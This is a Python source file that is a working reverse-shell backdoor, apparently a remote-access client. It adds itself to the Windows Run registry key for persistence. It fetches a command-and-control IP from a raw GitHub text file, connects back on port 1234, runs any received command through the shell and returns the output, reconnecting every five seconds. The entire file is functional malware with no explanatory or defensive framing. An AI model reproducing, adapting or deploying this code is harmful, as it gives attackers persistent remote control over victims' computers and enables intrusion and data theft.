import socket
import subprocess
import requests
import time
import os
import sys
import platform

if platform.system() == "Windows":
    import winreg as reg 

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def fetch_server_ip(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text.strip()
    except Exception as e:
        print(f"Failed to fetch server IP: {e}")
        return None

def connect_to_server(server_ip, port):
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, port))
            print(f"Connected to server {server_ip}:{port}")
            
            while True:
                command = client_socket.recv(1024)
                if not command:
                    break
                if command.strip().lower() == b'exit':
                    break
                output = execute_command(command.decode('utf-8').strip())
                client_socket.sendall(output.encode('utf-8'))
        except ConnectionResetError:
            print("Server closed the connection. Retrying...")
        except ConnectionRefusedError:
            print("Connection refused by the server. Retrying...")
        except Exception as e:
            print(f"Error occurred: {e}. Retrying...")
        finally:
            client_socket.close()
            time.sleep(5)  # Retry every 5 seconds

def add_to_startup(app_name, app_path):
    if platform.system() == "Windows":
        key = r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, app_path)
            reg.CloseKey(reg_key)
        except WindowsError as e:
            print(f'Failed to add {app_name} to startup: {e}')

if __name__ == '__main__':
    script_name = os.path.basename(sys.argv[0])
    app_name = script_name
    app_path = os.path.abspath(sys.argv[0])
    add_to_startup(app_name, app_path)

    server_url = "https://raw.githubusercontent.com/AhmedPythonCoder/server-client/main/host.txt"
    while True:
        server_ip = fetch_server_ip(server_url)
        if server_ip:
            connect_to_server(server_ip, port=1234)
        else:
            time.sleep(5)
